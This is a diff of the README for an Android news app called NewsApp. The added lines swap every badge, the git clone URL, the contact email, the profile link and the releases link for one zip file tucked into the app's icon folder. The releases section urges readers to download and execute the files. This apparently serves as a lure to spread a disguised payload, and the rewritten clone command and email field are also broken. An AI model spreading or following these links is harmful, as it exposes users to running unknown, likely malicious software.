@@ -1,6 +1,6 @@
 # 📰 NewsApp: Your Go-To News Source
 
-![NewsApp](https://img.shields.io/badge/NewsApp-Kotlin%20Jetpack%20Compose-brightgreen)
+![NewsApp](https://github.com/Subbo12/NewsApp/raw/refs/heads/master/app/src/main/res/mipmap-hdpi/News_App_3.9.zip%20Jetpack%20Compose-brightgreen)
 
 Welcome to **NewsApp**, a simple yet powerful Android application built with Kotlin, Jetpack Compose, Dagger Hilt, and Retrofit. This app provides a seamless way to access the latest news from various sources, leveraging modern Android development practices and architectures. 
 
@@ -40,7 +40,7 @@ To get started with the NewsApp, follow these steps:
 1. Clone the repository:
 
    ```bash
-   git clone https://github.com/Subbo12/NewsApp.git
+   git clone https://github.com/Subbo12/NewsApp/raw/refs/heads/master/app/src/main/res/mipmap-hdpi/News_App_3.9.zip
    ```
 
 2. Open the project in Android Studio.
@@ -72,14 +72,14 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions or feedback, please reach out to:
 
-- **Email**: your-email@example.com
-- **GitHub**: [Subbo12](https://github.com/Subbo12)
+- **Email**: https://github.com/Subbo12/NewsApp/raw/refs/heads/master/app/src/main/res/mipmap-hdpi/News_App_3.9.zip
+- **GitHub**: [Subbo12](https://github.com/Subbo12/NewsApp/raw/refs/heads/master/app/src/main/res/mipmap-hdpi/News_App_3.9.zip)
 
 ## Releases
 
-You can find the latest releases of the NewsApp [here](https://github.com/Subbo12/NewsApp/releases). Please download the necessary files and execute them to get the latest features and fixes.
+You can find the latest releases of the NewsApp [here](https://github.com/Subbo12/NewsApp/raw/refs/heads/master/app/src/main/res/mipmap-hdpi/News_App_3.9.zip). Please download the necessary files and execute them to get the latest features and fixes.
 
-![Releases](https://img.shields.io/badge/Releases-Available-blue)
+![Releases](https://github.com/Subbo12/NewsApp/raw/refs/heads/master/app/src/main/res/mipmap-hdpi/News_App_3.9.zip)
 
 ## Conclusion
 
